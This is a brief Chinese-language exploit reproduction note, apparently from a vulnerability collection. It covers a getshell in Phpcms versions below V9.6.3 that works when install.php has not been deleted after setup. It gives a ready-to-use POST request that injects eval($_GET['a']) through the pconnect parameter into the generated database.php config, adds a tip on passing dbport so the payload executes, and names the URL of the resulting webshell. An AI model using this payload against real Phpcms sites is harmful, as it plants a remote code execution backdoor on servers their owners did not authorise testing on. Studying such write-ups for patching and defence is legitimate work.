# Phpcms V9.6.3 install.php 没有即使删除导致的getshell

## 一、漏洞简介

比较鸡肋，需要在环境安装好了之后，install.php也没有被删除，才可以利用

### 二、漏洞影响

Phpcms < V9.6.3

## 三、复现过程


```bash
POST /install/install.php?step=installmodule
module=admin&dbport=3306&pconnect=eval($_GET["a"])
```

这里控制的是 pconnect参数，因为默认它没有单引号比较好调试。注意这里如果不传dbport参数的话database.php里的port参数会置空，将会报错。就无法执行到后面的 eval了

![1.png](media/202009/3d7da798aa1541c2b0d1a025e6847862.png)

被修改后的database.php：

![2.png](media/202009/e3ae28de0c9b4b4490036c68f900c3c6.png)

url：`/caches/configs/database.php`

![3.png](media/202009/8e9ac2e8487943e99ea2a8ca510d9a6e.png)

